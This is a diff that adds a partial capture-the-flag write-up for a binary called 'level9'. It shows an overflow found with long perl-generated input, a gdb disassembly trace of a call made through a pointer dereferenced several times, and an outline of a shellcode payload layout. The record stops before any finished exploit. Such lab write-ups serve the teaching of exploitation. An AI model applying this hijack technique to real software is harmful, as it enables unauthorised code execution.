@@ -1,0 +1,41 @@
+First we tried to understand what it does exactly. We thought is was compiled from C++.
+Anyway, understanding the classes involved was useless.
+
+We tried the basics (printf exploit, buffer-overflow):
+It segfaults when giving a long input
+
+    ./level9 `perl -e 'print "A"x200'`
+    segmentation fault
+
+The clue that showd us the way is in the main :
+
+    gdb> disas main
+    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]     # Dereferencing multiple times
+    0x08048680 <+140>:	mov    eax,DWORD PTR [eax]          #
+    0x08048682 <+142>:	mov    edx,DWORD PTR [eax]          #
+    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]     
+    0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
+    0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
+    0x08048690 <+156>:	mov    DWORD PTR [esp],eax
+    0x08048693 <+159>:	call   edx                          # Calling a function comming from the multiple dereferencing
+
+The addresses are :
+
+    gdb> b *0x0804867c
+    gdb> r blablabla
+    from peda
+    EAX: 0x804a078 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>)
+
+With a long buffer :
+
+    gdb> r `perl -e 'print "B"x200'`
+    EAX: 0x804a078 ('B' <repeats 34 times>)                 # Do you feel the shellcode comming ?? O-O
+
+So we have to pass through 2 more dereferencing with a great, homemade buffer.
+The payload:
+
+    [shellcode][offset][address A to B][address B to shellcode]
+
+    gdb> pattern_create 200
+    
+
